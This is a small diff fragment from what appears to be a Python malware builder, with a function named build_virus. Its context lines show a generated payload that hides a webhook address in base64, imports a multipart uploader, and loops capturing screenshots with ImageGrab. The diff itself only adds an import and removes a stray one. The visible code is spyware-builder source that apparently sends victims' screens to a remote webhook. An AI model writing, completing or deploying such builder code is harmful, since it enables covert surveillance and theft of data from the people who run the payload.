@@ -40,6 +40,7 @@ def build_virus():
 import json
 import requests
 import base64
+import time
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 {webhooklink_var_name} = base64.b64decode("{webhooklinkconvertedbase64}").decode()
 
@@ -1012,7 +1013,6 @@ from PIL import ImageGrab
 import os
 import io
 import base64
-import
 
 while True:
     image = ImageGrab.grab(
